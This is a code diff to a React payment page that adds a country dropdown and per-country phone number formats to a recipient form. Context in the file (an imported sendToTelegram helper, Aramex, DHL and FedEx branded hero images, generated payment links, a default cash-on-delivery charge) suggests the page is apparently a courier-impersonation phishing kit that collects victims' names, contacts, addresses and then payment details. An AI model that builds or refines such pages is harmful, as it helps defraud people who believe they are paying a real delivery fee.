@@ -10,6 +10,8 @@ import PaymentMetaTags from "@/components/PaymentMetaTags";
 import { useLink } from "@/hooks/useSupabase";
 import { sendToTelegram } from "@/lib/telegram";
 import { Shield, ArrowLeft, User, Mail, Phone, CreditCard, MapPin } from "lucide-react";
+import CountrySelector from "@/components/CountrySelector";
+import { COUNTRIES, getCountryByCode, getPhoneNumberFormat, type Country } from "@/lib/countries";
 import heroAramex from "@/assets/hero-aramex.jpg";
 import heroDhl from "@/assets/hero-dhl.jpg";
 import heroFedex from "@/assets/hero-fedex.jpg";
@@ -33,6 +35,7 @@ const PaymentRecipient = () => {
   const [customerEmail, setCustomerEmail] = useState("");
   const [customerPhone, setCustomerPhone] = useState("");
   const [residentialAddress, setResidentialAddress] = useState("");
+  const [selectedCountry, setSelectedCountry] = useState<Country>(COUNTRIES[0]); // Default to Saudi Arabia
   
   const serviceKey = linkData?.payload?.service_key || new URLSearchParams(window.location.search).get('service') || 'aramex';
   const serviceName = linkData?.payload?.service_name || serviceKey;
@@ -40,6 +43,9 @@ const PaymentRecipient = () => {
   const shippingInfo = linkData?.payload as any;
   const amount = shippingInfo?.cod_amount || 500;
   const formattedAmount = `${amount} ر.س`;
+  
+  // Get phone number format based on selected country
+  const phoneFormat = getPhoneNumberFormat(selectedCountry.code);
   
   const heroImages: Record<string, string> = {
     'aramex': heroAramex,
@@ -114,7 +120,9 @@ const PaymentRecipient = () => {
       phone: customerPhone,
       address: residentialAddress,
       service: serviceName,
-      amount: formattedAmount
+      amount: formattedAmount,
+      country: selectedCountry.code,
+      countryName: selectedCountry.nameAr
     }));
     navigate(`/pay/${id}/details`);
   };
@@ -183,6 +191,16 @@ const PaymentRecipient = () => {
 
                 <div className="space-y-3 sm:space-y-4 mb-6 sm:mb-8">
                   <div>
+                    <Label className="flex items-center gap-1.5 sm:gap-2 mb-1.5 sm:mb-2 text-xs sm:text-sm">
+                      الدولة
+                    </Label>
+                    <CountrySelector
+                      onSelect={setSelectedCountry}
+                      selectedCountry={selectedCountry}
+                    />
+                  </div>
+                  
+                  <div>
                     <Label htmlFor="name" className="flex items-center gap-1.5 sm:gap-2 mb-1.5 sm:mb-2 text-xs sm:text-sm">
                       <User className="w-3 h-3 sm:w-4 sm:h-4" />
                       الاسم الكامل
@@ -216,7 +234,7 @@ const PaymentRecipient = () => {
                   <div>
                     <Label htmlFor="phone" className="flex items-center gap-1.5 sm:gap-2 mb-1.5 sm:mb-2 text-xs sm:text-sm">
                       <Phone className="w-3 h-3 sm:w-4 sm:h-4" />
-                      رقم الهاتف
+                      رقم الهاتف ({selectedCountry.nameAr})
                     </Label>
                     <Input
                       id="phone"
@@ -225,8 +243,12 @@ const PaymentRecipient = () => {
                       onChange={(e) => setCustomerPhone(e.target.value)}
                       required
                       className="h-10 sm:h-12 text-sm sm:text-base"
-                      placeholder="+966 5X XXX XXXX"
+                      placeholder={phoneFormat.placeholder}
+                      pattern={phoneFormat.pattern}
                     />
+                    <p className="text-xs text-muted-foreground mt-1">
+                      مثال: {phoneFormat.placeholder}
+                    </p>
                   </div>
                   
                   <div>
